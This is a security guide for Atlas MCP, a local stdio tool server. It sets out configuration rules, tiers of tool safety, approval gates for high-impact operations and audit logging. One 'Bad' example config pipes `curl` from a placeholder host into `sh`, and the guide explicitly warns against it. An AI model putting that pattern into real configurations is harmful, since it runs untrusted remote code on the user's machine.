# MCP Security

Atlas MCP is local stdio only. It does not run an HTTP server, accept remote clients, dynamically register subcommands, or turn MCP input into shell command strings.

Recent MCP ecosystem advisories have focused on unsafe stdio configuration and attacker-controlled command execution. Atlas avoids that class of issue by keeping the server command explicit, boring, and local.

## Safe Configuration Rules

- Pin the server command to an absolute `tracker` path.
- Do not use `sh -c`, `npx`, curl pipes, or unpinned wrapper scripts in MCP config.
- Do not paste MCP config snippets from untrusted repositories or tickets.
- Do not let workspace files rewrite user MCP config.
- Do not configure Atlas MCP from arbitrary command strings.
- Do not expose high-impact tools in default setup docs.
- Treat tool annotations as hints, not authorization.

Good:

```toml
[mcp_servers.atlas]
command = "/Users/you/bin/tracker"
args = ["mcp", "serve", "--tool-profile", "read"]
```

Bad:

```toml
[mcp_servers.atlas]
command = "sh"
args = ["-c", "curl https://example.invalid/install | sh && tracker mcp serve"]
```

## Safety Tiers

1. `read`: read-only and plan/dry-run tools.
2. `workflow`: safe Atlas mutations with actor, reason, permissions, event metadata, and write lock.
3. `high-impact`: provider writes, sync/import/archive/compact/worktree cleanup, gate waive, ticket complete, and similar operations.

High-impact execution requires:

- selected profile allows the tool
- `--dangerously-allow-high-impact-tools`
- actor and non-empty reason
- existing Atlas permission policy
- one-time operation approval created outside MCP
- exact operation, target, and actor match
- unexpired, unused approval
- final policy recheck immediately before execution

Denied high-impact attempts are written to `.tracker/runtime/mcp/security-audit.jsonl`. Denial records do not include raw approval IDs; they only record whether an approval ID was supplied. Successful high-impact execution records keep the approval ID so an executed mutation can be tied back to the human approval. If a handler fails after consuming an approval, Atlas records an `execution_failed` row with the approval ID because the approval is already single-use at that point.

## v1.7 Governance Alignment

The v1.7 trust/governance train does not make Atlas MCP-first. MCP may expose safe read-only trust and governance status in a later adapter update, but it does not expose private-key operations and does not mutate trust by default.

High-impact MCP tools evaluate the same service-layer permission and governance checks as CLI, shell, and TUI paths. MCP approval tokens remain a transport safety gate, not proof that the actor has Atlas authority.

## References

- [MCP tools specification](https://mcp.mintlify.app/specification/2025-11-25/server/tools)
- [Official MCP Go SDK](https://github.com/modelcontextprotocol/go-sdk)
- [OX Security MCP supply-chain advisory](https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/)
